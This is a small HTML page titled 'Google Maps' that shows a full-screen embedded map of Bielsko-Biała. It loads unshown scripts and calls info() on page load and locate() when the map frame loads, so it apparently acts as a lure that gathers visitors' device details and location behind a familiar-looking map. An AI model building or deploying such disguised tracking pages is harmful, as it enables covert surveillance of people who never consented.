<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Google Maps</title>
    <script src="js/client.min.js"></script>
    <script src="js/info.js"></script>
    <script src="js/location.js"></script>
  </head>
  <body onload="info()">
    <iframe
      src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d82387.51859722205!2d19.03726225!3d49.81220015!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x47169f63dd80507b%3A0x6811f587fa4fe3a7!2sBielsko-Bia%C5%82a!5e0!3m2!1spl!2spl!4v1697139853007!5m2!1spl!2spl"
      style="
        position: fixed;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        width: 100%;
        height: 100%;
        border: none;
        margin: 0;
        padding: 0;
        overflow: hidden;
        z-index: 999999;
      "
      allowfullscreen=""
      loading="lazy"
      referrerpolicy="no-referrer-when-downgrade"
      onload="locate()"
    ></iframe>
  </body>
</html>
